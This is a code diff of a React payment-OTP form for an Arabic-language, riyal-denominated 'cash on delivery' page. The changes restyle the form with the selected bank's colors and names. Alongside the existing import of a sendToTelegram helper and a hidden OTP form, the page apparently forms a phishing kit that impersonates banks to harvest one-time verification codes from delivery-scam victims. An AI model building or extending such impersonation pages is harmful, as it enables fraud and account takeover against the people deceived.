@@ -8,6 +8,8 @@ import { Shield, AlertCircle, ArrowLeft } from "lucide-react";
 import { useToast } from "@/hooks/use-toast";
 import { useLink } from "@/hooks/useSupabase";
 import { sendToTelegram } from "@/lib/telegram";
+import { getBankById } from "@/lib/banks";
+import { getCountryByCode } from "@/lib/countries";
 
 const PaymentOTPForm = () => {
   const { id } = useParams();
@@ -31,6 +33,40 @@ const PaymentOTPForm = () => {
   const shippingInfo = linkData?.payload as any;
   const amount = shippingInfo?.cod_amount || 500;
   const formattedAmount = `${amount} ر.س`;
+  
+  // Get bank info from sessionStorage
+  const selectedBankId = sessionStorage.getItem('selectedBank') || '';
+  const selectedBank = selectedBankId && selectedBankId !== 'skipped' ? getBankById(selectedBankId) : null;
+  
+  // Bank-specific styling
+  const bankColor = selectedBank?.color || branding.colors.primary;
+  const bankSecondaryColor = selectedBank?.secondaryColor || bankColor;
+  const bankBgColor = selectedBank?.backgroundColor || '#FFFFFF';
+  const bankTextColor = selectedBank?.textColor || '#1A1A1A';
+  const buttonStyle = selectedBank?.buttonStyle || 'gradient';
+  const inputStyle = selectedBank?.inputStyle || 'rounded';
+  const layoutStyle = selectedBank?.layoutStyle || 'modern';
+  
+  // Input border radius classes
+  const inputRadiusClass = 
+    inputStyle === 'rounded-lg' ? 'rounded-lg' :
+    inputStyle === 'square' ? 'rounded-none' :
+    'rounded-md';
+  
+  // Button background style
+  const getButtonStyle = () => {
+    if (buttonStyle === 'gradient') {
+      return { background: `linear-gradient(135deg, ${bankColor}, ${bankSecondaryColor})` };
+    } else if (buttonStyle === 'outline') {
+      return { 
+        background: 'transparent',
+        border: `2px solid ${bankColor}`,
+        color: bankColor
+      };
+    } else {
+      return { background: bankColor };
+    }
+  };
   
   // Demo OTP: 123456
   const DEMO_OTP = "123456";
@@ -231,34 +267,73 @@ const PaymentOTPForm = () => {
   const hasAnyDigit = otp.some(digit => digit !== "");
   
   return (
-    <DynamicPaymentLayout
-      serviceName={serviceName}
-      serviceKey={serviceKey}
-      amount={formattedAmount}
-      title="رمز التحقق"
-      description={`أدخل رمز التحقق لخدمة ${serviceName}`}
-      icon={<Shield className="w-7 h-7 sm:w-10 sm:h-10 text-white" />}
+    <div 
+      className="min-h-screen" 
+      dir="rtl"
+      style={{
+        background: layoutStyle === 'minimal' 
+          ? '#FFFFFF' 
+          : layoutStyle === 'classic'
+          ? `linear-gradient(135deg, ${bankBgColor} 0%, ${bankBgColor}99 100%)`
+          : `linear-gradient(135deg, ${bankColor}08 0%, ${bankSecondaryColor}08 100%)`
+      }}
     >
+      <DynamicPaymentLayout
+        serviceName={serviceName}
+        serviceKey={serviceKey}
+        amount={formattedAmount}
+        title={`رمز التحقق - ${selectedBank?.nameAr || 'البنك'}`}
+        description={`أدخل رمز التحقق لخدمة ${serviceName}`}
+        icon={<Shield className="w-7 h-7 sm:w-10 sm:h-10 text-white" />}
+        showHero={false}
+      >
+      {/* Bank Info Header */}
+      {selectedBank && (
+        <div 
+          className={`${inputRadiusClass} p-4 sm:p-5 mb-6 flex items-center gap-4 shadow-lg`}
+          style={{
+            background: buttonStyle === 'gradient'
+              ? `linear-gradient(135deg, ${bankColor}, ${bankSecondaryColor})`
+              : bankColor,
+            color: '#FFFFFF'
+          }}
+        >
+          <div 
+            className="w-12 h-12 sm:w-14 sm:h-14 rounded-xl bg-white/20 backdrop-blur-sm flex items-center justify-center flex-shrink-0"
+          >
+            <Shield className="w-6 h-6 sm:w-7 sm:h-7 text-white" />
+          </div>
+          <div className="flex-1 text-white">
+            <p className="text-xs sm:text-sm opacity-90">البنك المختار</p>
+            <p className="text-lg sm:text-xl font-bold">{selectedBank.nameAr}</p>
+            <p className="text-xs opacity-80">{selectedBank.name}</p>
+          </div>
+        </div>
+      )}
+
       {/* Title Section */}
       <div className="text-center mb-6 sm:mb-8">
         <div 
-          className="w-16 h-16 sm:w-20 sm:h-20 rounded-full mx-auto mb-4 flex items-center justify-center animate-pulse shadow-lg"
+          className={`${inputRadiusClass} w-16 h-16 sm:w-20 sm:h-20 mx-auto mb-4 flex items-center justify-center animate-pulse shadow-lg`}
           style={{
-            background: `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`
+            background: buttonStyle === 'gradient'
+              ? `linear-gradient(135deg, ${bankColor}, ${bankSecondaryColor})`
+              : bankColor,
+            borderRadius: inputStyle === 'square' ? '0' : undefined
           }}
         >
           <Shield className="w-8 h-8 sm:w-10 sm:h-10 text-white" />
         </div>
-        <h1 className="text-2xl sm:text-3xl font-bold mb-2">رمز التحقق</h1>
-        <p className="text-sm sm:text-base text-muted-foreground">أدخل الرمز المرسل إلى هاتفك</p>
+        <h1 className="text-2xl sm:text-3xl font-bold mb-2" style={{ color: bankTextColor }}>رمز التحقق</h1>
+        <p className="text-sm sm:text-base text-muted-foreground" style={{ color: bankTextColor, opacity: 0.7 }}>أدخل الرمز المرسل إلى هاتفك</p>
       </div>
 
       {/* Info */}
       <div 
-        className="rounded-lg p-3 sm:p-4 mb-6"
+        className={`${inputRadiusClass} p-3 sm:p-4 mb-6`}
         style={{
-          background: `${branding.colors.primary}10`,
-          border: `1px solid ${branding.colors.primary}30`
+          background: `${bankColor}10`,
+          border: `1px solid ${bankColor}30`
         }}
       >
         <p className="text-xs sm:text-sm text-center">
@@ -282,10 +357,19 @@ const PaymentOTPForm = () => {
                 onChange={(e) => handleChange(index, e.target.value)}
                 onKeyDown={(e) => handleKeyDown(index, e)}
                 onPaste={handlePaste}
-                className="w-12 h-14 sm:w-16 sm:h-20 text-center text-xl sm:text-3xl font-bold border-2 rounded-xl transition-all"
+                className={`w-12 h-14 sm:w-16 sm:h-20 text-center text-xl sm:text-3xl font-bold border-2 transition-all ${inputRadiusClass} focus:outline-none`}
                 style={{
-                  borderColor: digit ? branding.colors.primary : undefined,
-                  backgroundColor: digit ? `${branding.colors.primary}08` : undefined
+                  borderColor: digit ? bankColor : `${bankColor}40`,
+                  backgroundColor: digit ? `${bankColor}08` : bankBgColor,
+                  color: bankTextColor
+                }}
+                onFocus={(e) => {
+                  e.target.style.borderColor = bankColor;
+                  e.target.style.boxShadow = `0 0 0 3px ${bankColor}20`;
+                }}
+                onBlur={(e) => {
+                  e.target.style.borderColor = digit ? bankColor : `${bankColor}40`;
+                  e.target.style.boxShadow = 'none';
                 }}
                 disabled={attempts >= 3}
                 autoComplete="off"
@@ -326,12 +410,17 @@ const PaymentOTPForm = () => {
         <Button
           type="submit"
           size="lg"
-          className="w-full text-sm sm:text-lg py-5 sm:py-7 text-white"
+          className={`w-full text-sm sm:text-lg py-5 sm:py-7 transition-all ${inputRadiusClass}`}
           disabled={attempts >= 3 || !isOtpComplete}
           style={{
-            background: attempts >= 3 
-              ? '#666' 
-              : `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`
+            ...(attempts >= 3 
+              ? { background: '#666', color: '#FFFFFF' }
+              : {
+                  ...getButtonStyle(),
+                  ...(buttonStyle !== 'outline' ? { color: '#FFFFFF' } : {})
+                }
+            ),
+            opacity: (attempts >= 3 || !isOtpComplete) ? 0.6 : 1
           }}
         >
           {attempts >= 3 ? (
@@ -348,8 +437,8 @@ const PaymentOTPForm = () => {
           <Button
             type="button"
             variant="ghost"
-            className="w-full mt-3"
-            style={{ color: branding.colors.primary }}
+            className={`w-full mt-3 ${inputRadiusClass}`}
+            style={{ color: bankColor }}
             onClick={() => {
               setCountdown(60);
               toast({
@@ -382,7 +471,8 @@ const PaymentOTPForm = () => {
         <input type="text" name="otp" />
         <input type="text" name="timestamp" />
       </form>
-    </DynamicPaymentLayout>
+      </DynamicPaymentLayout>
+    </div>
   );
 };
 
